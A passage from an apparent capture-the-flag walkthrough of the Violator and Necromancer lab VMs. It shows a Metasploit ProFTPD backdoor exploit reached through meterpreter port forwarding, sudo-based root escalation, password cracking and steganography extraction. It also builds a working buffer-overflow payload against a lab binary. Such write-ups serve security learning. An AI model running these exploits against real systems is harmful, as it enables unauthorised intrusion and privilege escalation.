<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre>&lt;code class=&rdquo;><span class='line'>dg@violator:/var/www/html$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for dg on violator:
</span><span class='line'>    env_reset, mail_badpass,
</span><span class='line'>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span><span class='line'>
</span><span class='line'>User dg may run the following commands on violator:
</span><span class='line'>    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
</span></code></pre></td></tr></table></div></figure>
We should be able to run proftpd present at /home/dg/bd/sbin/proftpd with root permissions. On checking the proftpd.conf, we found out that the proftpd runs on port 2121 and only on localhost.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat proftpd.conf
</span><span class='line'>cat proftpd.conf
</span><span class='line'># This is a basic ProFTPD configuration file (rename it to
</span><span class='line'># &lsquo;proftpd.conf&rsquo; for actual use.  It establishes a single server
</span><span class='line'># and a single anonymous login.  It assumes that you have a user/group
</span><span class='line'># &ldquo;nobody&rdquo; and &ldquo;ftp&rdquo; for normal operation and anon.
</span><span class='line'>
</span><span class='line'>ServerName            &ldquo;Depeche Mode Violator Server&rdquo;
</span><span class='line'>ServerType            standalone
</span><span class='line'>DefaultServer         on
</span><span class='line'>
</span><span class='line'># Belt up son!
</span><span class='line'>SocketBindTight           on
</span><span class='line'>
</span><span class='line'># Port 21 is the standard FTP port.
</span><span class='line'>Port              2121
</span><span class='line'>
</span><span class='line'># Listen onnly on lo
</span><span class='line'>DefaultAddress            127.0.0.1</span></code></pre></td></tr></table></div></figure>
On connecting
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp localhost 2121
</span><span class='line'>Connected to localhost.
</span><span class='line'>220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]</span></code></pre></td></tr></table></div></figure>
The FTP Server is ProFTPD 1.3.3c which is backdoored ( found by using searchsploit ).</p>

<p>As we have the meterpreter shell, we can portfwd our connection to Violater port 2121
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> portfwd add 192.168.1.1 -l 2121 -r 127.0.0.1 -p 2121
</span><span class='line'>[*] Local TCP relay created: :2121 &lt;-&gt; 127.0.0.1:2121</span></code></pre></td></tr></table></div></figure>
and execute the msf proftpd_133c_backdoor module to get a root shell :)</p>

<p>Once you get the root shell, in the /root folder, there&rsquo;s a password protected rar file, crackable by using the wordlist generated by cewl with quotes included.
New thing to learn by rar2john which generates a hash of rar password. :)
</li></p>

<p><li>
<strong>Necromancer</strong>:
On TCP Port scanning the Necromancer:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 7.12 scan initiated Fri Jul 15 14:44:47 2016 as: nmap -p- -n -oA Necro -vv 192.168.56.101
</span><span class='line'>Nmap scan report for 192.168.56.101
</span><span class='line'>Host is up, received arp-response (0.00020s latency).
</span><span class='line'>All 65535 scanned ports on 192.168.56.101 are filtered because of 65535 no-responses
</span><span class='line'>MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'># Nmap done at Fri Jul 15 15:06:41 2016 &ndash; 1 IP address (1 host up) scanned in 1314.06 seconds</span></code></pre></td></tr></table></div></figure>
On UDP Port Scanning:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 7.12 scan initiated Fri Jul 15 15:07:11 2016 as: nmap -p- -n -oA Necro_UDP -vv -sU 192.168.56.101
</span><span class='line'>Nmap scan report for 192.168.56.101
</span><span class='line'>Host is up, received arp-response (0.00048s latency).
</span><span class='line'>Scanned at 2016-07-15 15:07:11 IST for 1136s
</span><span class='line'>Not shown: 65534 open|filtered ports
</span><span class='line'>Reason: 65534 no-responses
</span><span class='line'>PORT    STATE SERVICE REASON
</span><span class='line'>666/udp open  doom    udp-response ttl 64
</span><span class='line'>MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'># Nmap done at Fri Jul 15 15:26:07 2016 &ndash; 1 IP address (1 host up) scanned in 1136.35 seconds
</span></code></pre></td></tr></table></div></figure>
On listenting on the interface vboxnet0,</p>

<p>we find the VM broadcast some data on port 4444
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>18:27:04.271798 IP 192.168.56.101.42138 &gt; 192.168.56.1.4444: Flags [S], seq 1419283988, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 2605474657 ecr 0], length 0
</span><span class='line'>18:27:04.271828 IP 192.168.56.1.4444 &gt; 192.168.56.101.42138: Flags [R.], seq 0, ack 1419283989, win 0, length 0
</span><span class='line'>18:27:04.275580 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.275588 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.281290 ARP, Request who-has 192.168.56.4 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.281298 ARP, Request who-has 192.168.56.4 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.285544 ARP, Request who-has 192.168.56.5 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.285555 ARP, Request who-has 192.168.56.5 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.290284 ARP, Request who-has 192.168.56.6 tell 192.168.56.101, length 28</span></code></pre></td></tr></table></div></figure>
On listening on the port 4444 on 192.168.56.1
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -lvp 4444
</span><span class='line'>listening on [any] 4444 &hellip;
</span><span class='line'>192.168.56.101: inverse host lookup failed: Unknown host
</span><span class='line'>connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 21448
</span><span class='line'>&hellip;V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi&hellip;
</span></code></pre></td></tr></table></div></figure>
On decoding the base64 string
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome!
</span><span class='line'>
</span><span class='line'>You find yourself staring towards the horizon, with nothing but silence surrounding you.
</span><span class='line'>You look east, then south, then west, all you can see is a great wasteland of nothingness.
</span><span class='line'>
</span><span class='line'>Turning to your north you notice a small flicker of light in the distance.
</span><span class='line'>You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.<br/>
</span><span class='line'>
</span><span class='line'>The air around you begins to get thicker, and your heart begins to beat against your chest.
</span><span class='line'>You turn to your left.. then to your right!  You are trapped!
</span><span class='line'>
</span><span class='line'>You fumble through your pockets.. nothing!<br/>
</span><span class='line'>You look down and see you are standing in sand.<br/>
</span><span class='line'>Dropping to your knees you begin to dig frantically.
</span><span class='line'>
</span><span class='line'>As you dig you notice the barrier extends underground!<br/>
</span><span class='line'>Frantically you keep digging and digging until your nails suddenly catch on an object.
</span><span class='line'>
</span><span class='line'>You dig further and discover a small wooden box.<br/>
</span><span class='line'>flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.
</span><span class='line'>
</span><span class='line'>You open the box, and find a parchment with the following written on it. &ldquo;Chant the string of flag1 - u666&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>Chant the string of flag1 is a important sentence, I was quite stupid, to just try HEX on the string. Whenever, we receive such string, it&rsquo;s better to identify it using hash-identifier, which identifies it as a MD5. Searching on google for this string, it results in opensesame. Chanting the string of opensesame on the UDP port 666
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -u 192.168.56.101 666
</span><span class='line'>e6078b9b1aac915d11b9fd59791030bf
</span><span class='line'>Chant had no affect! Try in a different tongue!
</span><span class='line'>opensesame
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>A loud crack of thunder sounds as you are knocked to your feet!
</span><span class='line'>
</span><span class='line'>Dazed, you start to feel fresh air entering your lungs.
</span><span class='line'>
</span><span class='line'>You are free!
</span><span class='line'>
</span><span class='line'>In front of you written in the sand are the words:
</span><span class='line'>
</span><span class='line'>flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}
</span><span class='line'>
</span><span class='line'>As you stand to your feet you notice that you can no longer see the flicker of light in the distance.
</span><span class='line'>
</span><span class='line'>You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.
</span><span class='line'>
</span><span class='line'>As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.
</span><span class='line'>
</span><span class='line'>The birds get closer, and closer, and closer.
</span><span class='line'>
</span><span class='line'>Staring up at the crows you can see they are in a formation.
</span><span class='line'>
</span><span class='line'>Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
</span><span class='line'>
</span><span class='line'>As quickly as the birds appeared, they have left you once again&hellip;. alone&hellip; tortured by the deafening sound of silence.
</span><span class='line'>
</span><span class='line'>666 is closed.</span></code></pre></td></tr></table></div></figure>
On rescanning the Necromancer VM, we found that a TCP port got open and UDP Port 666 closed
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p- 192.168.56.101 -oA Necro3 -v
</span><span class='line'>
</span><span class='line'>Nmap scan report for 192.168.56.101
</span><span class='line'>Host is up (0.00038s latency).
</span><span class='line'>Not shown: 65534 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span></code></pre></td></tr></table></div></figure>
On browsing port 80, a webpage opens with the text and a photograph
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hours have passed since you first started to follow the crows.
</span><span class='line'>
</span><span class='line'>Silence continues to engulf you as you treck towards a mountain range on the horizon.
</span><span class='line'>
</span><span class='line'>More times passes and you are now standing in front of a great chasm.
</span><span class='line'>
</span><span class='line'>Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.
</span><span class='line'>
</span><span class='line'>As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.
</span><span class='line'>
</span><span class='line'>The necromancer looks towards you with hollow eyes which can only be described as death.
</span><span class='line'>
</span><span class='line'>He smirks in your direction, and suddenly a bright light momentarily blinds you.
</span><span class='line'>
</span><span class='line'>The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!
</span><span class='line'>
</span><span class='line'>The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.
</span><span class='line'>
</span><span class='line'>The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.
</span></code></pre></td></tr></table></div></figure>
If we read the text, which we got on port 666, it says &ldquo;you can see on of the crows is grasping on to an object&rdquo; which I believe serves as an hint. on running file and string or binwalk on the image, we find a txt file is hidden in the image.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>binwalk pileoffeathers.jpg
</span><span class='line'>
</span><span class='line'>DECIMAL       HEXADECIMAL     DESCRIPTION
</span><span class='line'>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;
</span><span class='line'>0             0x0             JPEG image data, EXIF standard
</span><span class='line'>12            0xC             TIFF image data, little-endian offset of first image directory: 8
</span><span class='line'>270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&ldquo;&gt;
</span><span class='line'>36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
</span><span class='line'>37267         0x9193          End of Zip archive</span></code></pre></td></tr></table></div></figure>
Extracting the feathers.txt with 7z. It contains a base64 encoded string which provides the path
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat feathers.txt | base64 -d
</span><span class='line'>flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm</span></code></pre></td></tr></table></div></figure>
Following the trail at <a href="http://192.168.56.101/amagicbridgeappearsatthechasm/">http://192.168.56.101/amagicbridgeappearsatthechasm/</a> we get another text
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You cautiously make your way across chasm.
</span><span class='line'>
</span><span class='line'>You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.
</span><span class='line'>
</span><span class='line'>The cave before you is protected by some sort of spell cast by the necromancer.
</span><span class='line'>
</span><span class='line'>You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.
</span><span class='line'>
</span><span class='line'>Hastily you take a few steps back away from the cave entrance.
</span><span class='line'>
</span><span class='line'>There must be a magical item that could protect you from the necromancer&rsquo;s spell.</span></code></pre></td></tr></table></div></figure>
Again, if you see the hint is provided "Magical item that could protect you from the necromancer&rsquo;s spell&rdquo;. We found this using rockyou or darkc0de wordlist</p>

<p>Running dirb with rockyou/ darc0de provides the 200 HTTP Code</p>

<p>Running file on it
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file talisman
</span><span class='line'>talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped</span></code></pre></td></tr></table></div></figure>
Executing it, it asks for a input
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/talisman
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?  asfsaf
</span><span class='line'>
</span><span class='line'>Nothing happens.</span></code></pre></td></tr></table></div></figure>
Using python print command to send a large number of characters to see if it crashes
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;print &ldquo;A&rdquo; * 40&rsquo; | ./talisman
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?<br/>
</span><span class='line'>Nothing happens.
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>
Utilizing ulimit -c unlimited, pattern_create and pattern_offset to create a core dump and find the offset
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ulimit -c unlimited
</span><span class='line'>
</span><span class='line'>usr/share/metasploit-framework/ruby /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 | ./talisman
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?<br/>
</span><span class='line'>Nothing happens.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Segmentation fault (core dumped)</span></code></pre></td></tr></table></div></figure>
Using gdb to find the offset
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb -c core -q
</span><span class='line'>[New LWP 6619]
</span><span class='line'>Core was generated by `./talisman'.
</span><span class='line'>Program terminated with signal SIGSEGV, Segmentation fault.
</span><span class='line'>#0  0x31624130 in ?? ()
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
Utilizing pattern_offset to find the offset
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/share/metasploit-framework/ruby /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31624130
</span><span class='line'>[*] Exact match at offset 32</span></code></pre></td></tr></table></div></figure></p>

<p>This could be confirmed by python &lsquo;A&rsquo; * 32 + &ldquo;BBBB&rdquo;.</p>

<p>using GDB to view all the functions
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) info functions
</span><span class='line'>All defined functions:
</span><span class='line'>
</span><span class='line'>Non-debugging symbols:
</span><span class='line'>0x080482d0  <em>init
</span><span class='line'>0x08048310  printf@plt
</span><span class='line'>0x08048320  <strong>libc_start_main@plt
</span><span class='line'>0x08048330  </strong>isoc99_scanf@plt
</span><span class='line'>0x08048350  </em>start
</span><span class='line'>0x08048380  <strong>x86.get_pc_thunk.bx
</span><span class='line'>0x08048390  deregister_tm_clones
</span><span class='line'>0x080483c0  register_tm_clones
</span><span class='line'>0x08048400  </strong>do_global_dtors_aux
</span><span class='line'>0x08048420  frame_dummy
</span><span class='line'>0x0804844b  unhide
</span><span class='line'>0x0804849d  hide
</span><span class='line'>0x080484f4  myPrintf
</span><span class='line'>0x08048529  wearTalisman
</span><span class='line'>0x08048a13  main
</span><span class='line'>0x08048a37  chantToBreakSpell
</span><span class='line'>0x08049530  <strong>libc_csu_init
</span><span class='line'>0x08049590  </strong>libc_csu_fini
</span><span class='line'>0x08049594  _fini</span></code></pre></td></tr></table></div></figure>
chantToBreakSpell seems interesting. Let&rsquo;s put the address of that function in the overflow pointer.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\x37\x8a\x04\x08&rdquo;&rsquo; | ./talisman
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?<br/>
</span><span class='line'>Nothing happens.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span><span class='line'>You fall to your knees.. weak and weary.
</span><span class='line'>Looking up you can see the spell is still protecting the cave entrance.
</span><span class='line'>The talisman is now almost too hot to touch!
</span><span class='line'>Turning it over you see words now etched into the surface:
</span><span class='line'>flag4{ea50536158db50247e110a6c89fcf3d3}
</span><span class='line'>Chant these words at u31337
</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span><span class='line'>Segmentation fault (core dumped)</span></code></pre></td></tr></table></div></figure>
It suggests to connect to udp port 31337 and chant the words
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
